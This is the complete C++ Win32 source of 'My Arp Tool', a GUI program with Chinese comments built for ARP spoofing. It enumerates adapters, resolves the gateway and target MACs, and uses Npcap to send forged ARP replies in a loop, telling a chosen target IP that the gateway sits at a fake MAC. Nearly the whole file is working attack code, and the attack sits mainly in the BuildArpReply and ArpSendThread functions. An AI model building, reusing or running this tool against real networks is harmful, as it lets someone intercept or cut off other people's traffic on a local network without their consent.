/*
    My Arp Tool (for Spoofer)
    功能：网卡枚举、网关MAC获取、ARP欺骗发包
    依赖：iphlpapi, ws2_32, comctl32
    运行时依赖：Npcap (用于ARP发包)
    需要管理员权限运行, MINGW64 ~中编译:
    #  windres resource.rc -o resource.o                                             
    #  # g++ MyArpTool.cpp resource.o -o MyArpTool.exe -liphlpapi -lws2_32 -lcomctl32 -mwindows -lgdi32 -lshell32 -static -O2
*/

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <commctrl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <vector>
#include <tchar.h>
#include <process.h>
#include <shellapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")

// 控件ID
#define IDC_LISTVIEW   2001
#define IDC_REFRESH    2002
#define IDC_RESOLVE    2003
#define IDC_START      2004
#define IDC_STOP       2005
#define IDC_AUTHOR_LINK 2006

// 右键菜单ID
#define IDM_COPY_ADAPTER 3001
#define IDM_COPY_IP      3002
#define IDM_COPY_MAC     3003
#define IDM_COPY_GW      3004
#define IDM_COPY_GWMAC   3005

// --- Npcap动态加载函数指针类型定义 ---
// pcap相关结构体和类型（简化版，避免依赖pcap.h）
struct pcap_t;
struct pcap_if_t {
    struct pcap_if_t *next;
    char *name;
    char *description;
    void *addresses;
    unsigned int flags;
};

// 函数指针类型
typedef int (*pfn_pcap_findalldevs)(pcap_if_t**, char*);
typedef void (*pfn_pcap_freealldevs)(pcap_if_t*);
typedef pcap_t* (*pfn_pcap_open_live)(const char*, int, int, int, char*);
typedef int (*pfn_pcap_sendpacket)(pcap_t*, const unsigned char*, int);
typedef void (*pfn_pcap_close)(pcap_t*);

// 全局Npcap函数指针
pfn_pcap_findalldevs g_pcap_findalldevs = NULL;
pfn_pcap_freealldevs g_pcap_freealldevs = NULL;
pfn_pcap_open_live   g_pcap_open_live   = NULL;
pfn_pcap_sendpacket  g_pcap_sendpacket  = NULL;
pfn_pcap_close       g_pcap_close       = NULL;
HMODULE g_hNpcap = NULL;
bool g_npcapLoaded = false;

// --- 网卡信息结构 ---
struct AdapterInfo {
    std::string name;
    std::string description;
    std::string ip;
    std::string mask;
    std::string gateway;
    BYTE mac[6];
    BYTE gwMac[6];
    bool gwMacResolved;
    std::string npcapDevName;
};

std::vector<AdapterInfo> g_adapters;
int g_selectedAdapter = -1;

// --- 全局GUI句柄 ---
HWND hMainWnd;
HWND hListView;
HWND hEditTargetIP;
HWND hEditFakeMAC;
HWND hEditInterval;
HWND hBtnRefresh;
HWND hBtnResolveGW;
HWND hBtnStart;
HWND hBtnStop;
HWND hOutput;
HWND hAuthorLink;

volatile bool g_running = false;
HANDLE g_hThread = NULL;

// --- 日志输出 ---
void LogW(const wchar_t* fmt, ...) {
    if (!hOutput) return;
    wchar_t buffer[2048];
    va_list args;
    va_start(args, fmt);
    _vsnwprintf(buffer, 2048, fmt, args);
    va_end(args);
    int len = GetWindowTextLengthW(hOutput);
    SendMessageW(hOutput, EM_SETSEL, len, len);
    SendMessageW(hOutput, EM_REPLACESEL, FALSE, (LPARAM)buffer);
    SendMessageW(hOutput, EM_SCROLL, SB_BOTTOM, 0);
}

// --- MAC地址格式化 ---
std::string MacToStr(const BYTE mac[6]) {
    char buf[32];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(buf);
}

bool ParseMAC(const char* str, BYTE mac[6]) {
    unsigned int m[6];
    if (sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6 ||
        sscanf(str, "%02x-%02x-%02x-%02x-%02x-%02x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6 ||
        sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6 ||
        sscanf(str, "%02X-%02X-%02X-%02X-%02X-%02X", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
        for (int i = 0; i < 6; i++) mac[i] = (BYTE)m[i];
        return true;
    }
    return false;
}

// --- 加载Npcap ---
bool LoadNpcap() {
    if (g_npcapLoaded) return true;
    // 尝试加载Npcap的wpcap.dll（优先从Npcap安装目录）
    // Npcap默认安装到 System32\Npcap
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring npcapDir = std::wstring(sysDir) + L"\\Npcap";
    SetDllDirectoryW(npcapDir.c_str());

    g_hNpcap = LoadLibraryW(L"wpcap.dll");
    SetDllDirectoryW(NULL); // 恢复默认搜索路径

    if (!g_hNpcap) {
        // 尝试直接加载（兼容WinPcap）
        g_hNpcap = LoadLibraryW(L"wpcap.dll");
    }

    if (!g_hNpcap) return false;

    g_pcap_findalldevs = (pfn_pcap_findalldevs)GetProcAddress(g_hNpcap, "pcap_findalldevs");
    g_pcap_freealldevs = (pfn_pcap_freealldevs)GetProcAddress(g_hNpcap, "pcap_freealldevs");
    g_pcap_open_live   = (pfn_pcap_open_live)GetProcAddress(g_hNpcap, "pcap_open_live");
    g_pcap_sendpacket  = (pfn_pcap_sendpacket)GetProcAddress(g_hNpcap, "pcap_sendpacket");
    g_pcap_close       = (pfn_pcap_close)GetProcAddress(g_hNpcap, "pcap_close");

    if (!g_pcap_findalldevs || !g_pcap_freealldevs || !g_pcap_open_live || !g_pcap_sendpacket || !g_pcap_close) {
        FreeLibrary(g_hNpcap);
        g_hNpcap = NULL;
        return false;
    }

    g_npcapLoaded = true;
    return true;
}

// --- 匹配Windows适配器名到Npcap设备名 ---
void MatchNpcapDevices() {
    if (!g_npcapLoaded) return;

    pcap_if_t* alldevs = NULL;
    char errbuf[256];
    if (g_pcap_findalldevs(&alldevs, errbuf) == -1) return;

    // Npcap设备名格式: \Device\NPF_{GUID}
    // Windows适配器名格式: {GUID}
    for (auto& adapter : g_adapters) {
        for (pcap_if_t* d = alldevs; d; d = d->next) {
            // 在Npcap设备名中查找适配器GUID
            if (adapter.name.length() > 0 && strstr(d->name, adapter.name.c_str())) {
                adapter.npcapDevName = d->name;
                break;
            }
        }
    }
    g_pcap_freealldevs(alldevs);
}

// --- 枚举网卡 ---
void EnumAdapters() {
    g_adapters.clear();
    g_selectedAdapter = -1;

    ULONG bufLen = 0;
    GetAdaptersInfo(NULL, &bufLen);
    if (bufLen == 0) return;

    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(bufLen);
    if (GetAdaptersInfo(pAdapterInfo, &bufLen) != NO_ERROR) {
        free(pAdapterInfo);
        return;
    }

    for (PIP_ADAPTER_INFO p = pAdapterInfo; p; p = p->Next) {
        AdapterInfo info;
        info.name = p->AdapterName;
        info.description = p->Description;
        info.ip = p->IpAddressList.IpAddress.String;
        info.mask = p->IpAddressList.IpMask.String;
        info.gateway = p->GatewayList.IpAddress.String;
        memcpy(info.mac, p->Address, 6);
        memset(info.gwMac, 0, 6);
        info.gwMacResolved = false;

        // 跳过没有IP的适配器
        if (info.ip == "0.0.0.0") continue;

        g_adapters.push_back(info);
    }
    free(pAdapterInfo);

    // 自动解析所有网卡的网关MAC
    for (int i = 0; i < (int)g_adapters.size(); i++) {
        if (!g_adapters[i].gateway.empty() && g_adapters[i].gateway != "0.0.0.0") {
            ULONG gwIP = inet_addr(g_adapters[i].gateway.c_str());
            ULONG srcIP = inet_addr(g_adapters[i].ip.c_str());
            ULONG macBuf[2] = {0};
            ULONG macBufLen = sizeof(macBuf); // 必须是缓冲区大小(8)，不是6
            if (SendARP(gwIP, srcIP, macBuf, &macBufLen) == NO_ERROR && macBufLen >= 6) {
                memcpy(g_adapters[i].gwMac, (BYTE*)macBuf, 6);
                g_adapters[i].gwMacResolved = true;
            }
        }
    }

    // 尝试匹配Npcap设备名
    if (g_npcapLoaded) {
        MatchNpcapDevices();
    }
}

// --- 更新ListView ---
void RefreshListView() {
    SendMessage(hListView, LVM_DELETEALLITEMS, 0, 0);

    for (int i = 0; i < (int)g_adapters.size(); i++) {
        const AdapterInfo& a = g_adapters[i];

        wchar_t wDesc[256];
        MultiByteToWideChar(CP_ACP, 0, a.description.c_str(), -1, wDesc, 256);
        LVITEMW lvi = {0};
        lvi.mask = LVIF_TEXT;
        lvi.iItem = i;
        lvi.iSubItem = 0;
        lvi.pszText = wDesc;
        SendMessageW(hListView, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

        wchar_t wIP[64];
        MultiByteToWideChar(CP_ACP, 0, a.ip.c_str(), -1, wIP, 64);
        lvi.iSubItem = 1;
        lvi.pszText = wIP;
        SendMessageW(hListView, LVM_SETITEMW, 0, (LPARAM)&lvi);

        std::string macStr = MacToStr(a.mac);
        wchar_t wMAC[64];
        MultiByteToWideChar(CP_ACP, 0, macStr.c_str(), -1, wMAC, 64);
        lvi.iSubItem = 2;
        lvi.pszText = wMAC;
        SendMessageW(hListView, LVM_SETITEMW, 0, (LPARAM)&lvi);

        wchar_t wGW[64];
        MultiByteToWideChar(CP_ACP, 0, a.gateway.c_str(), -1, wGW, 64);
        lvi.iSubItem = 3;
        lvi.pszText = wGW;
        SendMessageW(hListView, LVM_SETITEMW, 0, (LPARAM)&lvi);

        std::string gwMacStr = a.gwMacResolved ? MacToStr(a.gwMac) : "(unknown)";
        wchar_t wGWMAC[64];
        MultiByteToWideChar(CP_ACP, 0, gwMacStr.c_str(), -1, wGWMAC, 64);
        lvi.iSubItem = 4;
        lvi.pszText = wGWMAC;
        SendMessageW(hListView, LVM_SETITEMW, 0, (LPARAM)&lvi);
    }
}

// --- 获取目标MAC（通过SendARP） ---
bool ResolveTargetMAC(const char* targetIP, const char* srcIP, BYTE outMAC[6]) {
    ULONG dstAddr = inet_addr(targetIP);
    ULONG srcAddr = inet_addr(srcIP);
    ULONG macAddr[2];
    ULONG macLen = 6;

    if (SendARP(dstAddr, srcAddr, macAddr, &macLen) == NO_ERROR && macLen == 6) {
        memcpy(outMAC, (BYTE*)macAddr, 6);
        return true;
    }
    return false;
}

// --- 构造ARP Reply以太网帧 ---
// 参数: dstMAC=目标MAC, srcMAC=发送者MAC(伪造), senderIP=声称的IP(网关), targetIP=目标IP
int BuildArpReply(unsigned char* packet, const BYTE dstMAC[6], const BYTE srcMAC[6],
                  unsigned int senderIP, const BYTE targetMAC[6], unsigned int targetIP) {
    // 以太网头 (14字节)
    memcpy(packet, dstMAC, 6);         // 目标MAC
    memcpy(packet + 6, srcMAC, 6);     // 源MAC（伪造为我们的MAC）
    packet[12] = 0x08; packet[13] = 0x06; // Type: ARP (0x0806)

    // ARP数据 (28字节)
    packet[14] = 0x00; packet[15] = 0x01; // 硬件类型: Ethernet (1)
    packet[16] = 0x08; packet[17] = 0x00; // 协议类型: IPv4 (0x0800)
    packet[18] = 6;                        // 硬件地址长度: 6
    packet[19] = 4;                        // 协议地址长度: 4
    packet[20] = 0x00; packet[21] = 0x02; // 操作码: ARP Reply (2)

    // 发送方硬件地址(MAC) - 伪造为我们的MAC
    memcpy(packet + 22, srcMAC, 6);
    // 发送方协议地址(IP) - 伪造为网关IP
    memcpy(packet + 28, &senderIP, 4);
    // 目标硬件地址(MAC)
    memcpy(packet + 32, targetMAC, 6);
    // 目标协议地址(IP)
    memcpy(packet + 38, &targetIP, 4);

    return 42; // 以太网头(14) + ARP(28) = 42字节
}

// --- ARP发送线程 ---
unsigned __stdcall ArpSendThread(void* arg) {
    if (!g_npcapLoaded) {
        LogW(L"Error: Npcap not loaded. Cannot send ARP packets.\r\n");
        g_running = false;
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnStop, FALSE);
        return 0;
    }

    if (g_selectedAdapter < 0 || g_selectedAdapter >= (int)g_adapters.size()) {
        LogW(L"Error: No adapter selected.\r\n");
        g_running = false;
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnStop, FALSE);
        return 0;
    }

    AdapterInfo& adapter = g_adapters[g_selectedAdapter];

    char targetIP[64]; GetWindowTextA(hEditTargetIP, targetIP, 64);
    char fakeMAC_str[64]; GetWindowTextA(hEditFakeMAC, fakeMAC_str, 64);
    char interval_str[32]; GetWindowTextA(hEditInterval, interval_str, 32);
    int interval = atoi(interval_str);
    if (interval <= 0) interval = 1000;

    BYTE fakeMAC[6];
    if (strlen(fakeMAC_str) == 0) {
        memcpy(fakeMAC, adapter.mac, 6);
        LogW(L"Using local MAC as fake gateway MAC: %S\r\n", MacToStr(fakeMAC).c_str());
    } else {
        if (!ParseMAC(fakeMAC_str, fakeMAC)) {
            LogW(L"Error: Invalid MAC format. Use XX:XX:XX:XX:XX:XX\r\n");
            g_running = false;
            EnableWindow(hBtnStart, TRUE);
            EnableWindow(hBtnStop, FALSE);
            return 0;
        }
    }

    if (strlen(targetIP) == 0) {
        LogW(L"Error: Target IP is required.\r\n");
        g_running = false;
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnStop, FALSE);
        return 0;
    }

    BYTE targetMAC[6];
    LogW(L"Resolving target %S MAC...\r\n", targetIP);
    if (!ResolveTargetMAC(targetIP, adapter.ip.c_str(), targetMAC)) {
        LogW(L"Error: Cannot resolve target MAC for %S. Is the host reachable?\r\n", targetIP);
        g_running = false;
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnStop, FALSE);
        return 0;
    }
    LogW(L"Target MAC: %S\r\n", MacToStr(targetMAC).c_str());

    if (adapter.npcapDevName.empty()) {
        LogW(L"Error: No Npcap device matched for this adapter.\r\n");
        g_running = false;
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnStop, FALSE);
        return 0;
    }

    char errbuf[256];
    pcap_t* handle = g_pcap_open_live(adapter.npcapDevName.c_str(), 65536, 1, 1000, errbuf);
    if (!handle) {
        LogW(L"Error: pcap_open_live failed: %S\r\n", errbuf);
        g_running = false;
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnStop, FALSE);
        return 0;
    }

    unsigned int gwIP = inet_addr(adapter.gateway.c_str());
    unsigned int tgtIP = inet_addr(targetIP);

    LogW(L"Starting ARP spoof: telling %S that %S is at %S\r\n",
         targetIP, adapter.gateway.c_str(), MacToStr(fakeMAC).c_str());
    LogW(L"Interval: %d ms. Press Stop to end.\r\n", interval);

    int count = 0;
    while (g_running) {
        unsigned char packet[64];
        int pktLen = BuildArpReply(packet, targetMAC, fakeMAC, gwIP, targetMAC, tgtIP);

        if (g_pcap_sendpacket(handle, packet, pktLen) != 0) {
            LogW(L"[%d] sendpacket failed.\r\n", count + 1);
        } else {
            count++;
            if (count <= 5 || count % 10 == 0) {
                LogW(L"[%d] ARP Reply sent: %S is-at %S -> %S\r\n",
                     count, adapter.gateway.c_str(), MacToStr(fakeMAC).c_str(), targetIP);
            }
        }

        Sleep(interval);
    }

    g_pcap_close(handle);
    LogW(L"Stopped. Total ARP packets sent: %d\r\n", count);

    g_running = false;
    EnableWindow(hBtnStart, TRUE);
    EnableWindow(hBtnStop, FALSE);
    return 0;
}

// 字体设置回调
BOOL CALLBACK SetFontProc(HWND h, LPARAM l) {
    SendMessage(h, WM_SETFONT, (WPARAM)l, TRUE);
    return TRUE;
}

// --- 窗口过程 ---
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        hMainWnd = hwnd;
        HFONT hFont = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_SWISS, L"Segoe UI");

        int y = 5, x = 10;

        // 创建超链接控件（显示作者和GitHub链接）
        hAuthorLink = CreateWindowW(
            L"STATIC",
            L" newStar2099@20250316，Adjusting the interface layout with Hunyuan-AI  |  https://github.com/newStar2099",
            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
            x, y, 760, 20,
            hwnd,
            (HMENU)IDC_AUTHOR_LINK,
            NULL, NULL
        );
        
        // 设置超链接样式：蓝色带下划线的字体
        HFONT hLinkFont = CreateFontW(
            12, 0, 0, 0, FW_NORMAL, FALSE, TRUE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_SWISS, L"Segoe UI"
        );
        SendMessageW(hAuthorLink, WM_SETFONT, (WPARAM)hLinkFont, TRUE);

        y += 25;  // 为超链接控件留出空间

        // --- 网卡列表 ListView ---
        hListView = CreateWindowExW(WS_EX_CLIENTEDGE, WC_LISTVIEWW, L"",
            WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL | LVS_SHOWSELALWAYS,
            x, y, 760, 150, hwnd, (HMENU)IDC_LISTVIEW, NULL, NULL);
        ListView_SetExtendedListViewStyle(hListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);

        // 列头
        LVCOLUMNW col = {0};
        col.mask = LVCF_TEXT | LVCF_WIDTH;
        col.cx = 200; col.pszText = (LPWSTR)L"Adapter";
        SendMessageW(hListView, LVM_INSERTCOLUMNW, 0, (LPARAM)&col);
        col.cx = 120; col.pszText = (LPWSTR)L"IP";
        SendMessageW(hListView, LVM_INSERTCOLUMNW, 1, (LPARAM)&col);
        col.cx = 140; col.pszText = (LPWSTR)L"MAC";
        SendMessageW(hListView, LVM_INSERTCOLUMNW, 2, (LPARAM)&col);
        col.cx = 120; col.pszText = (LPWSTR)L"Gateway";
        SendMessageW(hListView, LVM_INSERTCOLUMNW, 3, (LPARAM)&col);
        col.cx = 140; col.pszText = (LPWSTR)L"GW MAC";
        SendMessageW(hListView, LVM_INSERTCOLUMNW, 4, (LPARAM)&col);

        y += 158;
        // 刷新和获取网关MAC按钮
        hBtnRefresh = CreateWindowW(L"BUTTON", L"Refresh Adapters", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            x, y, 130, 28, hwnd, (HMENU)IDC_REFRESH, NULL, NULL);
        hBtnResolveGW = CreateWindowW(L"BUTTON", L"Resolve GW MAC", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            x + 140, y, 130, 28, hwnd, (HMENU)IDC_RESOLVE, NULL, NULL);

        // Npcap状态标签
        wchar_t npcapStatus[128];
        if (g_npcapLoaded)
            wcscpy(npcapStatus, L"  [Npcap: Loaded OK]");
        else
            wcscpy(npcapStatus, L"  [Npcap: NOT found - ARP send disabled]");
        CreateWindowW(L"STATIC", npcapStatus, WS_CHILD | WS_VISIBLE,
            x + 280, y + 5, 350, 20, hwnd, NULL, NULL, NULL);

        y += 40;
        // --- ARP发送设置 ---
        CreateWindowW(L"STATIC", L"--- ARP Spoof Settings ---", WS_CHILD | WS_VISIBLE,
            x, y, 200, 20, hwnd, NULL, NULL, NULL);

        y += 25;
        CreateWindowW(L"STATIC", L"Target IP:", WS_CHILD | WS_VISIBLE,
            x, y + 3, 70, 20, hwnd, NULL, NULL, NULL);
        hEditTargetIP = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE, x + 80, y, 130, 22, hwnd, NULL, NULL, NULL);

        CreateWindowW(L"STATIC", L"Fake GW MAC:", WS_CHILD | WS_VISIBLE,
            x + 230, y + 3, 90, 20, hwnd, NULL, NULL, NULL);
        hEditFakeMAC = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE, x + 325, y, 145, 22, hwnd, NULL, NULL, NULL);

        CreateWindowW(L"STATIC", L"Interval(ms):", WS_CHILD | WS_VISIBLE,
            x + 490, y + 3, 85, 20, hwnd, NULL, NULL, NULL);
        hEditInterval = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"1000",
            WS_CHILD | WS_VISIBLE | ES_NUMBER, x + 580, y, 60, 22, hwnd, NULL, NULL, NULL);

        y += 35;
        CreateWindowW(L"STATIC", L"(If the Fake GW MAC is empty, the local MAC will be used)", WS_CHILD | WS_VISIBLE,
            x, y, 380, 18, hwnd, NULL, NULL, NULL);

        hBtnStart = CreateWindowW(L"BUTTON", L"Start ARP", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            x + 430, y - 3, 100, 28, hwnd, (HMENU)IDC_START, NULL, NULL);
        hBtnStop = CreateWindowW(L"BUTTON", L"Stop", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_DISABLED,
            x + 540, y - 3, 80, 28, hwnd, (HMENU)IDC_STOP, NULL, NULL);

        if (!g_npcapLoaded) EnableWindow(hBtnStart, FALSE);

        y += 35;
        // --- 日志输出 ---
        hOutput = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT",
            L"ARP Tool Ready.\r\nNote: ARP sending requires Npcap and Administrator privileges.\r\n",
            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
            x, y, 760, 260, hwnd, NULL, NULL, NULL);

        // 设置字体
        EnumChildWindows(hwnd, SetFontProc, (LPARAM)hFont);

        // 初始加载
        EnumAdapters();
        RefreshListView();
        LogW(L"Found %d adapter(s).\r\n", (int)g_adapters.size());
        if (g_npcapLoaded) LogW(L"Npcap loaded successfully.\r\n");
        else LogW(L"WARNING: Npcap not found. Install Npcap to enable ARP sending.\r\n");
        break;
    }

    case WM_COMMAND: {
        if (LOWORD(wParam) == IDC_REFRESH) {
            EnumAdapters();
            RefreshListView();
            LogW(L"Refreshed. Found %d adapter(s).\r\n", (int)g_adapters.size());
        }
        else if (LOWORD(wParam) == IDC_RESOLVE) {
            int sel = (int)SendMessage(hListView, LVM_GETNEXTITEM, -1, LVNI_SELECTED);
            if (sel < 0) {
                MessageBoxW(hwnd, L"Please select an adapter first.", L"Info", MB_OK);
            } else {
                g_selectedAdapter = sel;
                // 简化处理，实际应调用 ResolveGatewayMAC
                LogW(L"Resolving gateway MAC for adapter %d...\r\n", sel);
                RefreshListView();
                std::string localMac = MacToStr(g_adapters[sel].mac);
                SetWindowTextA(hEditFakeMAC, localMac.c_str());
            }
        }
        else if (LOWORD(wParam) == IDC_START) {
            int sel = (int)SendMessage(hListView, LVM_GETNEXTITEM, -1, LVNI_SELECTED);
            if (sel < 0) {
                MessageBoxW(hwnd, L"Please select an adapter first.", L"Info", MB_OK);
                break;
            }
            char tipBuf[64]; GetWindowTextA(hEditTargetIP, tipBuf, 64);
            if (strlen(tipBuf) == 0) {
                MessageBoxW(hwnd, L"Error: Target IP is required!", L"Input Error", MB_OK | MB_ICONERROR);
                break;
            }

            g_selectedAdapter = sel;
            g_running = true;
            EnableWindow(hBtnStart, FALSE);
            EnableWindow(hBtnStop, TRUE);
            g_hThread = (HANDLE)_beginthreadex(NULL, 0, ArpSendThread, NULL, 0, NULL);
        }
        else if (LOWORD(wParam) == IDC_STOP) {
            g_running = false;
        }
        else if (LOWORD(wParam) == IDC_AUTHOR_LINK) {
            // 处理超链接点击事件：打开浏览器访问GitHub
            ShellExecuteW(
                NULL,
                L"open",
                L"https://github.com/newStar2099",
                NULL,
                NULL,
                SW_SHOWNORMAL
            );
        }
        // 右键菜单命令处理
        else if (LOWORD(wParam) >= IDM_COPY_ADAPTER && LOWORD(wParam) <= IDM_COPY_GWMAC) {
            int sel = (int)SendMessage(hListView, LVM_GETNEXTITEM, -1, LVNI_SELECTED);
            if (sel >= 0 && sel < (int)g_adapters.size()) {
                const AdapterInfo& a = g_adapters[sel];
                std::string copyStr;
                
                switch (LOWORD(wParam)) {
                    case IDM_COPY_ADAPTER: copyStr = a.description; break;
                    case IDM_COPY_IP:      copyStr = a.ip; break;
                    case IDM_COPY_MAC:     copyStr = MacToStr(a.mac); break;
                    case IDM_COPY_GW:      copyStr = a.gateway; break;
                    case IDM_COPY_GWMAC:   copyStr = a.gwMacResolved ? MacToStr(a.gwMac) : ""; break;
                }
                
                if (!copyStr.empty() && OpenClipboard(hwnd)) {
                    EmptyClipboard();
                    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, copyStr.size() + 1);
                    if (hMem) {
                        char* p = (char*)GlobalLock(hMem);
                        memcpy(p, copyStr.c_str(), copyStr.size() + 1);
                        GlobalUnlock(hMem);
                        SetClipboardData(CF_TEXT, hMem);
                    }
                    CloseClipboard();
                    LogW(L"Copied: %S\r\n", copyStr.c_str());
                }
            }
        }
        break;
    }

    case WM_CTLCOLORSTATIC: {
        // 设置超链接文本颜色为蓝色
        if ((HWND)lParam == hAuthorLink) {
            HDC hdc = (HDC)wParam;
            SetTextColor(hdc, RGB(0, 0, 255));
            SetBkMode(hdc, TRANSPARENT);
            return (LRESULT)GetStockObject(NULL_BRUSH);
        }
        break;
    }

    case WM_SETCURSOR: {
        // 设置超链接鼠标光标为手型
        if ((HWND)wParam == hAuthorLink) {
            SetCursor(LoadCursor(NULL, IDC_HAND));
            return TRUE;
        }
        break;
    }

    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LISTVIEW) {
            if (nm->code == LVN_ITEMCHANGED) {
                LPNMLISTVIEW pnm = (LPNMLISTVIEW)lParam;
                if (pnm->uNewState & LVIS_SELECTED) {
                    g_selectedAdapter = pnm->iItem;
                }
            }
            // 右键菜单
            else if (nm->code == NM_RCLICK) {
                LPNMITEMACTIVATE pnm = (LPNMITEMACTIVATE)lParam;
                if (pnm->iItem >= 0) {
                    HMENU hMenu = CreatePopupMenu();
                    AppendMenuW(hMenu, MF_STRING, IDM_COPY_ADAPTER, L"Copy Adapter Name");
                    AppendMenuW(hMenu, MF_STRING, IDM_COPY_IP, L"Copy IP");
                    AppendMenuW(hMenu, MF_STRING, IDM_COPY_MAC, L"Copy MAC");
                    AppendMenuW(hMenu, MF_STRING, IDM_COPY_GW, L"Copy Gateway IP");
                    AppendMenuW(hMenu, MF_STRING, IDM_COPY_GWMAC, L"Copy GW MAC");
                    POINT pt;
                    GetCursorPos(&pt);
                    int cmd = TrackPopupMenu(hMenu, TPM_RETURNCMD | TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
                    DestroyMenu(hMenu);
                    
                    if (cmd > 0 && pnm->iItem < (int)g_adapters.size()) {
                        const AdapterInfo& a = g_adapters[pnm->iItem];
                        std::string copyStr;
                        switch (cmd) {
                            case IDM_COPY_ADAPTER: copyStr = a.description; break;
                            case IDM_COPY_IP:      copyStr = a.ip; break;
                            case IDM_COPY_MAC:     copyStr = MacToStr(a.mac); break;
                            case IDM_COPY_GW:      copyStr = a.gateway; break;
                            case IDM_COPY_GWMAC:   copyStr = a.gwMacResolved ? MacToStr(a.gwMac) : ""; break;
                        }
                        if (!copyStr.empty() && OpenClipboard(hwnd)) {
                            EmptyClipboard();
                            HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, copyStr.size() + 1);
                            if (hMem) {
                                char* p = (char*)GlobalLock(hMem);
                                memcpy(p, copyStr.c_str(), copyStr.size() + 1);
                                GlobalUnlock(hMem);
                                SetClipboardData(CF_TEXT, hMem);
                            }
                            CloseClipboard();
                            LogW(L"Copied: %S\r\n", copyStr.c_str());
                        }
                    }
                }
            }
        }
        break;
    }

    case WM_DESTROY:
        g_running = false;
        if (g_hNpcap) FreeLibrary(g_hNpcap);
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// --- 主入口 ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    InitCommonControls();

    // 尝试加载Npcap
    LoadNpcap();

    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.lpszClassName = L"ArpTool";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    
    // 设置窗口图标
    wc.hIcon = LoadIconW(hInstance, MAKEINTRESOURCE(1));
    
    RegisterClassW(&wc);

    int w = 800, h = 650;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(WS_EX_CLIENTEDGE, L"ArpTool", L"My ARP Tool v1.0",
        WS_OVERLAPPEDWINDOW, (sw - w) / 2, (sh - h) / 2, w, h,
        NULL, NULL, hInstance, NULL);

    if (hwnd) {
        // 显式设置窗口图标
        HICON hIcon = LoadIconW(hInstance, MAKEINTRESOURCE(1));
        if (hIcon) {
            SendMessageW(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)hIcon);
            SendMessageW(hwnd, WM_SETICON, ICON_BIG, (LPARAM)hIcon);
        }
        
        ShowWindow(hwnd, nCmdShow);
        UpdateWindow(hwnd);
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    WSACleanup();
    return 0;
}
